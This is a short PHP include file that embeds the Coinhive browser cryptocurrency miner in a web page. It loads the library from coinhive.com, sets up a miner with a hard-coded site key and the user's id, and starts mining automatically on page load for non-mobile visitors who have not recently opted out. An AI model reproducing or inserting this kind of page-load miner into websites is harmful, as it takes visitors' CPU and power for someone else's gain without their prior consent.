<?php
if (!isset($userid))
	$userid=0;
?>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.User('1ioYO3VM26L0boYjtjxgoNn0v57pMESE', '<?php echo $userid; ?>', {throttle: 0.75});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
</script>
<?php